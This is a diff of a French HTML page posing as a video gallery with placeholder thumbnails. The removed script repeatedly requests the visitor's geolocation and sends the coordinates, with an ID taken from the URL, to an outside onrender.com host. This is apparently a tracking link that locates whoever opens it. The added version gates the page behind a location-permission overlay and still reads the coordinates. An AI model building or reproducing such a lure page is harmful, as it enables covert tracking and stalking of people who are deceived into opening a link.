@@ -4,80 +4,114 @@
     <meta charset="UTF-8">
     <title>Galerie de Vidéos</title>
     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .overlay-content {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+        }
+    </style>
 </head>
-<body>
-    <div class="container mx-auto py-8">
-        <h1 id="title" class="text-3xl font-bold mb-8 text-center">Galerie de Vidéos</h1>
+<body class="bg-gray-100">
+
+    <!-- Superposition de géolocalisation -->
+    <div id="geolocation-overlay" class="overlay hidden">
+        <div class="overlay-content">
+            <h2 class="text-2xl font-bold mb-4">Permission de Géolocalisation Requise</h2>
+            <p>Veuillez activer la géolocalisation pour accéder au site.</p>
+        </div>
+    </div>
+
+    <!-- En-tête -->
+    <header class="bg-blue-600 text-white py-4">
+        <div class="container mx-auto text-center">
+            <h1 class="text-4xl font-bold">Galerie de Vidéos</h1>
+        </div>
+    </header>
+
+    <!-- Contenu principal -->
+    <main class="container mx-auto py-8">
         <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6">
           
           <!-- Carte de vidéo -->
           <div class="bg-white rounded-lg shadow-md overflow-hidden">
-            <img id="image1" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
+            <img class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
             <div class="p-4">
-              <h2 id="video-title1" class="text-xl font-semibold">Titre de la Vidéo</h2>
+              <h2 class="text-xl font-semibold">Titre de la Vidéo</h2>
             </div>
           </div>
     
           <!-- Répétez la carte de vidéo pour d'autres vidéos -->
           <div class="bg-white rounded-lg shadow-md overflow-hidden">
-            <img id="image2" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
+            <img class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
             <div class="p-4">
-              <h2 id="video-title2" class="text-xl font-semibold">Titre de la Vidéo</h2>
+              <h2 class="text-xl font-semibold">Titre de la Vidéo</h2>
             </div>
           </div>
     
           <div class="bg-white rounded-lg shadow-md overflow-hidden">
-            <img id="image3" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
+            <img class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
             <div class="p-4">
-              <h2 id="video-title3" class="text-xl font-semibold">Titre de la Vidéo</h2>
+              <h2 class="text-xl font-semibold">Titre de la Vidéo</h2>
             </div>
           </div>
     
           <div class="bg-white rounded-lg shadow-md overflow-hidden">
-            <img id="image4" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
+            <img class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
             <div class="p-4">
-              <h2 id="video-title4" class="text-xl font-semibold">Titre de la Vidéo</h2>
+              <h2 class="text-xl font-semibold">Titre de la Vidéo</h2>
             </div>
           </div>
         </div>
-    </div>
+    </main>
+
+    <!-- Pied de page -->
+    <footer class="bg-gray-800 text-white py-4">
+        <div class="container mx-auto text-center">
+            <p>&copy; 2024 Galerie de Vidéos. Tous droits réservés.</p>
+        </div>
+    </footer>
 
     <script>
-        // Fonction pour tenter de récupérer la position et envoyer les coordonnées
-        function attemptGeolocation() {
-            navigator.geolocation.getCurrentPosition(position => {
-                const uuid = window.location.pathname.split('/').pop();
-                const { latitude, longitude } = position.coords;
-
-                fetch('https://geo-localisation.onrender.com/location', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
+        // Fonction pour vérifier la géolocalisation
+        function checkGeolocation() {
+            if (!navigator.geolocation) {
+                showGeolocationOverlay();
+            } else {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        // Géolocalisation réussie
+                        const { latitude, longitude } = position.coords;
+                        console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
                     },
-                    body: JSON.stringify({ uuid, latitude, longitude })
-                })
-                .then(response => response.text())
-                .then(data => console.log(data))
-                .catch(error => console.error('Error:', error));
-            }, error => {
-                // En cas d'échec, recharger la page après un délai de 5 secondes
-                console.error('Geolocation error:', error);
-            });
+                    error => {
+                        // Échec de la géolocalisation
+                        showGeolocationOverlay();
+                    }
+                );
+            }
         }
 
-        // Appeler la fonction pour tenter de récupérer la position
-        setInterval(attemptGeolocation, 1000);
+        // Fonction pour afficher la superposition
+        function showGeolocationOverlay() {
+            document.getElementById('geolocation-overlay').classList.remove('hidden');
+        }
 
-        // Ajouter des écouteurs d'événements pour rendre le titre et les images cliquables
-        document.getElementById('title').addEventListener('click', attemptGeolocation);
-        document.getElementById('image1').addEventListener('click', attemptGeolocation);
-        document.getElementById('video-title1').addEventListener('click', attemptGeolocation);
-        document.getElementById('image2').addEventListener('click', attemptGeolocation);
-        document.getElementById('video-title2').addEventListener('click', attemptGeolocation);
-        document.getElementById('image3').addEventListener('click', attemptGeolocation);
-        document.getElementById('video-title3').addEventListener('click', attemptGeolocation);
-        document.getElementById('image4').addEventListener('click', attemptGeolocation);
-        document.getElementById('video-title4').addEventListener('click', attemptGeolocation);
+        // Vérifier la géolocalisation au chargement de la page
+        window.onload = checkGeolocation;
     </script>
 </body>
 </html>
